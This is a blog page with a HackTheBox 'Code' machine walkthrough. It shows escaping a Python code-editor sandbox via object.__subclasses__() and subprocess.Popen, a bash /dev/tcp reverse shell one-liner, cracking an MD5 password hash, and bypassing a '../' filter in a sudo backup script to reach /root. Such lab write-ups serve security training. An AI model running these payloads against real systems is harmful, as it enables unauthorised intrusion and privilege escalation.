@@ -1,0 +1,733 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/macabely.png">
+  <link rel="icon" href="/img/macabely.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Macabely">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="My walkthrough in code machine on HackTheBox">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Code Machine (Easy)">
+<meta property="og:url" content="https://xyz-macabely.github.io/2025/08/05/htb-m/code/index.html">
+<meta property="og:site_name" content="Macabely">
+<meta property="og:description" content="My walkthrough in code machine on HackTheBox">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://xyz-macabely.github.io/images/htb-m/code/1.jpg">
+<meta property="article:published_time" content="2025-08-04T21:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-30T09:21:58.171Z">
+<meta property="article:author" content="Macabely">
+<meta property="article:tag" content="htb">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="machines">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xyz-macabely.github.io/images/htb-m/code/1.jpg">
+  
+  
+  
+  <title>HTB Code Machine (Easy) - Macabely</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xyz-macabely.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Macabely</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://x.com/Macabely97021" target="_self">
+                <i class="iconfont icon-twitter-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://www.linkedin.com/in/ali-hassan-02a479219" target="_self">
+                <i class="iconfont icon-linkedin-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/null') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Code Machine (Easy)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Code Machine (Easy)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="/images/htb-m/code/1.jpg" srcset="/img/loading.gif" lazyload><br>Here I’m gonna walk through how I solved the <strong>Code</strong> machine. It’s a Linux machine, an easy one on HackTheBox.</p>
+<h1 id="I-Reconnaissance"><a href="#I-Reconnaissance" class="headerlink" title="I Reconnaissance"></a>I Reconnaissance</h1><p>First, i started by grabbing the machine IP and pasting it on the browser, noticed it didn’t give me any response, not even a domain to add it in <code>/etc/hosts</code> file.</p>
+<p><img src="/images/htb-m/code/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>Then i decided to run a simple Nmap scan, to see what’s going on with the server:</p>
+<p><img src="/images/htb-m/code/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>Noticed there is an SSH server and upnp server is open on port 5000, by navigating to that port in the browser to see what it has. I realized it’s a simple code editor, an IDE like vscode that can be used to run code.</p>
+<p><img src="/images/htb-m/code/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>I start analyzing JavaScript files to search for sensitive data or endpoints. I found some, but they led to absolutely nothing. Then i started looking for vulns related to this version, found nothing. So i started to play a little bit with the code editor.</p>
+<h1 id="II-Analyze"><a href="#II-Analyze" class="headerlink" title="II Analyze"></a>II Analyze</h1><p>Start with a simple code <code>print(os.name)</code>, realized that there were restricted words (os, sys, platform, import,….etc) that i don’t have access to, indicating some type of WAF exists in place.</p>
+<p><img src="/images/htb-m/code/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>We have nothing now, we need a way to execute arbitrary commands (since this is a common thing in HTB, get into the system and read the flag). One way to do that is to find <code>classes</code> that will help to execute commands on the server. To do this, we first need to know the classes that exist in the server or the Python environment. There are several ways to do that.</p>
+<ul>
+<li><strong>1</strong>: You can add an empty tuple <code>()</code> appending the <code>__class__</code> attribute to it following by the <code>__bases__</code> attribute that will return the inherits classes, adding <code>.__subclasses__()</code> method at the last thing that will return all the classes inherit from an object (since everything in python is an object).</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>((()).__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__())</code></pre></div>
+
+<ul>
+<li><strong>2</strong>: OR you can do it with empty string (<code>&#39;&#39;</code>) instead of tuple (<code>()</code>):</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__())</code></pre></div>
+
+<ul>
+<li><strong>3</strong>: OR use empty list if you want (<code>[]</code>).</li>
+</ul>
+<p>But the easiest way is to use the object reference itself (if it’s not restricted)</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">object</span>.__subclasses__())</code></pre></div>
+
+<p><img src="/images/htb-m/code/6.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="III-Exploit"><a href="#III-Exploit" class="headerlink" title="III Exploit"></a>III Exploit</h1><p>As you can see, we have a bunch of classes; we only focus on ones with <strong>command execution</strong>. There are several ones (<code>socket.socket</code>, <code>os._wrap_close</code>, <code>subprocess.Popen</code>) that may help us to get a <strong>reverse shell</strong>. Let’s use <code>subprocess.Popen</code>. But the problem is that to use this class, we need to know its index. And to know its index, we don’t have a way other than brute forcing it.</p>
+<p><img src="/images/htb-m/code/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>By increasing the number from <strong>1</strong> until we find the intended class that we want. We’re gonna use that number as the intended index in our payload after.<br>You can brute force this easily with Burp Intruder, and you will successfully find the index.</p>
+<h1 id="IV-Reverse-Shell"><a href="#IV-Reverse-Shell" class="headerlink" title="IV Reverse Shell"></a>IV Reverse Shell</h1><p>Now we can use <code>subprocess.Popen</code> to execute our reverse shell.</p>
+<p>We first need to establish a listener: <code>nc -lvnp 9001</code>. Then run this code:</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">317</span>]([<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1&quot;</span>]))</code></pre></div>
+
+<p>We successfully got a reverse shell:<br><img src="/images/htb-m/code/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>By executing the <code>ls</code> command to list the files in the dir, as you can see, we have the source code of our app: <code>app.py</code></p>
+<p><img src="/images/htb-m/code/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>It has the secret key for signing the Flask session. Probably, maybe we could use it to sign an arbitrary session later. I copied the code and pasted into my VS Code, and found that part of code:</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:
+ username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]
+ password = hashlib.md5(request.form[<span class="hljs-string">&#x27;password&#x27;</span>].encode()).hexdigest()
+ existing_user = User.query.filter_by(username=username).first()
+        <span class="hljs-keyword">if</span> existing_user:
+ flash(<span class="hljs-string">&#x27;User already exists. Please choose a different username.&#x27;</span>)
+        <span class="hljs-keyword">else</span>:
+ new_user = User(username=username, password=password)
+ db.session.add(new_user)
+ db.session.commit()
+ flash(<span class="hljs-string">&#x27;Registration successful! You can now log in.&#x27;</span>)
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))</code></pre></div>
+
+<p>The passwords from the registration page got MD5 hashed in the database, which we may crack it.<br>Navigating further, you will find the first flag at the <code>/app-production</code> directory:</p>
+<p><img src="/images/htb-m/code/10.png" srcset="/img/loading.gif" lazyload alt="User Flag"></p>
+<p>But where is the second flag? Maybe we need to find some creds that will help us get access on other user?</p>
+<p>By navigating to the <code>/instacne</code> directory, I found a database file. We may find the creds here?<br><img src="/images/htb-m/code/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>I found a password hash for a user called <strong>martin</strong>. After cracking the hash on <a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a>.<br>We now have a username and password that we can use to log in as <strong>martin</strong>.</p>
+<h1 id="V-Root"><a href="#V-Root" class="headerlink" title="V Root"></a>V Root</h1><p>By executing this command in the terminal, <code>ssh martin@10.10.11.62</code>.<br>Noticed you successfully logged in, but unfortunately, we don’t have access to the root directory.</p>
+<p>By executing this command: <code>sudo -l</code> to see if i have access to sudo or not and what commands i can run, i found the following:<br><img src="/images/htb-m/code/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>i have access to a <code>backy.sh</code> script. What is that script even doing? I cat the file to read it and found this code:</p>
+<div class="code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/bash</span>
+
+<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$#</span> -ne 1 ]]; <span class="hljs-keyword">then</span>
+    /usr/bin/echo <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> &lt;task.json&gt;&quot;</span>
+    <span class="hljs-built_in">exit</span> 1
+<span class="hljs-keyword">fi</span>
+
+json_file=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>
+
+<span class="hljs-keyword">if</span> [[ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span> ]]; <span class="hljs-keyword">then</span>
+    /usr/bin/echo <span class="hljs-string">&quot;Error: File &#x27;<span class="hljs-variable">$json_file</span>&#x27; not found.&quot;</span>
+    <span class="hljs-built_in">exit</span> 1
+<span class="hljs-keyword">fi</span>
+
+allowed_paths=(<span class="hljs-string">&quot;/var/&quot;</span> <span class="hljs-string">&quot;/home/&quot;</span>)
+
+updated_json=$(/usr/bin/jq <span class="hljs-string">&#x27;.directories_to_archive |= map(gsub(&quot;\\.\\./&quot;; &quot;&quot;))&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span>)
+
+/usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$updated_json</span>&quot;</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span>
+
+directories_to_archive=$(/usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$updated_json</span>&quot;</span> | /usr/bin/jq -r <span class="hljs-string">&#x27;.directories_to_archive[]&#x27;</span>)
+
+<span class="hljs-function"><span class="hljs-title">is_allowed_path</span></span>() &#123;
+    <span class="hljs-built_in">local</span> path=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>
+    <span class="hljs-keyword">for</span> allowed_path <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;allowed_paths[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span>
+        <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$path</span>&quot;</span> == <span class="hljs-string">&quot;<span class="hljs-variable">$allowed_path</span>&quot;</span>* ]]; <span class="hljs-keyword">then</span>
+            <span class="hljs-built_in">return</span> 0
+        <span class="hljs-keyword">fi</span>
+    <span class="hljs-keyword">done</span>
+    <span class="hljs-built_in">return</span> 1
+&#125;
+
+<span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$directories_to_archive</span>; <span class="hljs-keyword">do</span>
+    <span class="hljs-keyword">if</span> ! is_allowed_path <span class="hljs-string">&quot;<span class="hljs-variable">$dir</span>&quot;</span>; <span class="hljs-keyword">then</span>
+        /usr/bin/echo <span class="hljs-string">&quot;Error: <span class="hljs-variable">$dir</span> is not allowed. Only directories under /var/ and /home/ are allowed.&quot;</span>
+        <span class="hljs-built_in">exit</span> 1
+    <span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">done</span>
+
+/usr/bin/backy <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span></code></pre></div>
+<p>By reading its code. It’s a bash script that uses a JSON file you provide and then goes to a specific route (mentioned in the JSON file), compresses files that exist at that route, and then puts the compressed file in another specific route (mentioned in the JSON file).</p>
+<p>Noticed, there are allowed paths in place <code>/var/</code>, <code>/home/</code> that you can choose to compress the files. Also in the script, you can see it uses <code>jq</code> to parse the JSON file and filter it from <code>../</code>, preventing path traversal (But that is actually so easy to bypass)</p>
+<div class="code-wrapper"><pre><code class="hljs BASH">allowed_paths=(<span class="hljs-string">&quot;/var/&quot;</span> <span class="hljs-string">&quot;/home/&quot;</span>)
+updated_json=$(/usr/bin/jq <span class="hljs-string">&#x27;.directories_to_archive |= map(gsub(&quot;\\.\\./&quot;; &quot;&quot;))&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$json_file</span>&quot;</span>)</code></pre></div>
+
+<p>Fine, but what does that JSON file look like? I have no idea…..likely, i found an example file located in my dir, so i read it and it looks like this:</p>
+<div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;destination&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/martin/backups/&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;multiprocessing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;verbose_log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;directories_to_archive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;/home/app-production/app&quot;</span>
+ <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+
+    <span class="hljs-attr">&quot;exclude&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;.*&quot;</span>
+ <span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+<p>We need to change that <code>directories_to_archive</code> parameter value to the <code>/root</code> directory so the script can get its files and compress them. To achieve that, we need path traversal. Since there is a filter for it that filters <code>../</code> we can easily bypass that by doubling the sequence <code>....//</code> so it will remove one and leave one.</p>
+<p>The JSON file created will look like the following:</p>
+<div class="code-wrapper"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;destination&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/martin/backups/&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;multiprocessing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;verbose_log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;directories_to_archive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;/home/....//root/&quot;</span>
+ <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+
+    <span class="hljs-attr">&quot;exclude&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;.*&quot;</span>
+ <span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+<p>You can then run the script on your file: <code>sudo /usr/bin/backy.sh testing.json</code>.</p>
+<p><img src="/images/htb-m/code/13.png" srcset="/img/loading.gif" lazyload alt="Root Flag"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/htb/" class="print-no-link">#htb</a>
+      
+        <a href="/tags/linux/" class="print-no-link">#linux</a>
+      
+        <a href="/tags/machines/" class="print-no-link">#machines</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/10/cyberxbytes/" title="CyberXbytes Web challenges">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CyberXbytes Web challenges</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/01/cybertalents/" title="CyberTalents Web challenges">
+                        <span class="hidden-mobile">CyberTalents Web challenges</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
